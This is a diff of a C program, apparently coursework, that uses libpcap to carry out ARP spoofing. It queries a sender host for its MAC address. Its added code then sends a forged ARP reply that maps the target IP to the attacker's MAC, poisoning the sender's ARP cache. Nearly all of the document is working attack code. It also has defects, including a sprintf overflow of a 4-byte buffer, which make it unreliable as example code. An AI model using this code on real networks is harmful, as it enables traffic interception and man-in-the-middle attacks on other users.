@@ -88,7 +88,6 @@ int main(int argc, char* argv[])
 	ioctl(sock, SIOCGIFADDR, &ifr);
 	struct in_addr my_ip_addr = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
 
-	//printf("IP Address is %s\n",inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
 	printf("IP Address is %s\n",inet_ntoa(my_ip_addr));
 
 	close(sock);
@@ -106,30 +105,23 @@ int main(int argc, char* argv[])
 
 	#define SIZE_ETHERNET 14
 
-
     inet_pton(AF_INET,argv[2],&senderIP.s_addr);
 	inet_pton(AF_INET,argv[3],&targetIP.s_addr);
 
 	eth = (struct sniff_ethernet*)malloc(sizeof(struct sniff_ethernet));
 	arp = (struct arphdr*)malloc(sizeof(struct arphdr));
-	printf("choi\n");
 	memcpy(eth->ether_dhost,"\xff\xff\xff\xff\xff\xff",ETHER_ADDR_LEN);
 	memcpy(eth->ether_shost,mac_address,ETHER_ADDR_LEN);
 	eth->ether_type = htons(0x0806);
-	printf("kim\n");
 	arp->htype = htons(0x0001);
 	arp->ptype = htons(0x0800);
 	arp->hlen = 0x06;
 	arp->plen = 0x04;
 	arp->oper = htons(0x0001);
 	memcpy(arp->sha,mac_address,6);
-	printf("1\n");
 	memcpy(arp->spa,&my_ip_addr,4);
-	printf("2\n");
 	memcpy(arp->tha,"\x00\x00\x00\x00\x00\x00",6);
-	printf("3\n");
 	memcpy(arp->tpa,&senderIP,4);
-	printf("4\n");
 	packet = (u_char*)malloc(sizeof(struct sniff_ethernet)+sizeof(struct arphdr));
 
 	memcpy(packet,eth,sizeof(struct sniff_ethernet));
@@ -138,11 +130,9 @@ int main(int argc, char* argv[])
 
 	printf("packet_len : %d\n",packet_len);
 
-	printf("memset ok\n");
   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-  printf("handle\n");
   if (handle == NULL) {
     fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
     return -1;
@@ -160,7 +150,6 @@ int main(int argc, char* argv[])
 	while(1){
 		if(pcap_sendpacket(handle,packet,packet_len) == 0)
 			break;
-			//printf("sbsbsbsbsb\n");
 	}
 	
 	while (1) {
@@ -172,29 +161,64 @@ int main(int argc, char* argv[])
      -2 if EOF was reached reading from an offline capture
     */
     recv_eth = (struct sniff_ethernet*)packet;
-
-    printf("Start!\n");
-    printf("*************************************************************************\n");
-
-    if(recv_eth->ether_type == 0x0806) //arp
+    if(ntohs(recv_eth->ether_type) == 0x0806) //arp
     {
     	recv_arp = (struct arphdr*)(packet + SIZE_ETHERNET);
 
-    	if(recv_arp->oper == htons(0x0002))
+    	if(ntohs(recv_arp->oper) == 0x0002)
     	{
     		char* ptr;
   	
 			u_char* ip_buf_tmp = (u_char*)malloc(4);
-    		sprintf(ip_buf_tmp, "%x%x%x%x",recv_arp->tpa[3],recv_arp->tpa[2],recv_arp->tpa[1],recv_arp->tpa[0]);
+    		sprintf(ip_buf_tmp, "%x%x%x%x",recv_arp->spa[3],recv_arp->spa[2],recv_arp->spa[1],recv_arp->spa[0]);
+    		printf("senderIP.s_addr : %x\n",senderIP.s_addr);
+    		printf("ip_buf_tmp : %x \n",strtol(ip_buf_tmp,&ptr,16));
     		if(senderIP.s_addr == strtol(ip_buf_tmp,&ptr,16))
     		{
+    			for(i=0;i<60;i++)
+   				{
+    				printf("%02x ",packet[i]);
+    			}
+    			printf("\n");
     			memcpy(recv_mac,recv_eth->ether_shost,6);
-    			printf("recv mac :%s\n",recv_mac);
+    			printf("recv_mac : ");
+    			for(i=0;i<6;i++)
+    			{
+    				printf("%02x",recv_mac[i]);
+    				if(i != 5) printf(":");
+    	
+    			}
+    			printf("\n");
     		}
     	}
     }
-	
+    break;
+}
+	eth = (struct sniff_ethernet*)malloc(sizeof(struct sniff_ethernet));
+	arp = (struct arphdr*)malloc(sizeof(struct arphdr));
+	memcpy(eth->ether_dhost,recv_mac,ETHER_ADDR_LEN);
+	memcpy(eth->ether_shost,mac_address,ETHER_ADDR_LEN);
+	eth->ether_type = htons(0x0806);
+	arp->htype = htons(0x0001);
+	arp->ptype = htons(0x0800);
+	arp->hlen = 0x06;
+	arp->plen = 0x04;
+	arp->oper = htons(0x0002);
+	memcpy(arp->sha,mac_address,6);
+	memcpy(arp->spa,&targetIP,4);
+	memcpy(arp->tha,recv_mac,6);
+	memcpy(arp->tpa,&senderIP,4);
+	packet = (u_char*)malloc(sizeof(struct sniff_ethernet)+sizeof(struct arphdr));
+
+	memcpy(packet,eth,sizeof(struct sniff_ethernet));
+	memcpy(packet+sizeof(struct sniff_ethernet),arp,sizeof(struct arphdr));
+	packet_len = sizeof(struct sniff_ethernet) + sizeof(struct arphdr);
+
+	while(1){
+		if(pcap_sendpacket(handle,packet,packet_len) == 0)
+			break;
 	}
+	
 } 
 
 
